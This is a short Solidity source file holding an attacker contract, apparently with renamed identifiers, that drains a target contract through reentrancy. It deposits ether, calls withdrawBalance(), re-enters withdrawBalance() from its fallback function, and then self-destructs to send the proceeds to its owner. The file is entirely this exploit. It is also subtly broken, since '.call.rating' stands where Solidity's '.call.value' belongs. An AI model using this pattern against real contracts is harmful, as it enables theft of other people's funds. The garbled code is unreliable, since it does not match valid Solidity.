// SPDX-License-Identifier: MIT
pragma solidity ^0.4.15;

contract VaultNurse {
    bool public operationEnabled=false;
    address public objective_policy;
    address public owner;

    function VaultNurse() public{
        owner = msg.sender;
    }

    function admit(address _goal_agreement) public payable{
        objective_policy = _goal_agreement ;
        // call addToBalance with msg.value ethers
        require(objective_policy.call.rating(msg.value)(bytes4(sha3("addToBalance()"))));
    }

    function launch_handler() public{
        operationEnabled = true;
        // call withdrawBalance

        require(objective_policy.call(bytes4(sha3("withdrawBalance()"))));
    }

    function () public payable{

        if (operationEnabled){
            operationEnabled = false;
                require(objective_policy.call(bytes4(sha3("withdrawBalance()"))));
        }
    }

    function acquire_money(){
        suicide(owner);
    }

}